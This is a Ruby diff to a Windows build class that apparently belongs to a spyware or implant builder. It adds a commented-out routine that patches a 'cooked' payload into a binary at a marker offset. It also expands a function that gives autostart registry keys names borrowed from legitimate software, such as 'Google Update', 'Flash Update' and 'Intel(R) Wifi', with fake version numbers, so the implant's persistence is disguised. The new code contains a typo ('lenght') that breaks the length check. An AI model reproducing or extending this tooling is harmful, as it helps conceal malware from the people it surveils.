@@ -308,6 +308,15 @@ class BuildWindows < Build
         end
       end
 
+=begin
+      content = File.open(path(silent_file), 'rb') {|f| f.read}
+      offset = content.index("\xef\xbe\xad\xde".force_encoding('ASCII-8BIT'))
+      raise "offset is nil" if offset.nil?
+      output = content.binary_patch_at_offset offset, cooked
+
+      File.open(path('output'), 'wb') {|f| f.write output}
+
+=end
       # delete the cooked output file and overwrite it with the silent output
       FileUtils.rm_rf path('output')
       FileUtils.cp path('silent'), path('output')
@@ -367,10 +376,20 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
-    fake_names = ['Restore Point', 'Backup Status', 'HD Audio', 'HD Audio balance', 'Bluetooth Pairing',
-                  'Intel(R) Common Interface', 'Intel PROSet', 'Delayed launcher', 'Intel USB 3.0', 'Smart Connect',
-                  'Java(TM) SE update', 'Audio Background', 'Wifi Manager']
-    fake_names[seed.ord % fake_names.size]
+    fakever = (seed[2].ord % 10).to_s + '.' + (seed.slice(0..2).unpack('S').first % 100).to_s
+
+    fake_names = ['Restore Point',      'Backup Status',    'HD Audio',         'HD Audio balance', 'Bluetooth Pairing',
+                  'Intel(R) Interface', 'Intel PROSet',     'Delayed launcher', 'Intel USB Device', 'Smart Connect',
+                  'Java(TM) SE update', 'Audio Background', 'Wifi Manager',     'Adobe(R) Updater', 'Google Update',
+                  'Broadcom WiFi',      'Intel(R) Wifi',    'Track Gestures',   'Wifi Assistant',   'Flash Update'
+                 ]
+
+    # the name must be less than 23
+    name = fake_names[seed.ord % fake_names.size] + ' ' + fakever
+
+    raise "Registry key name too long" if name.lenght > 23
+
+    return name
   end
 
   def old_reg_start_key(seed)
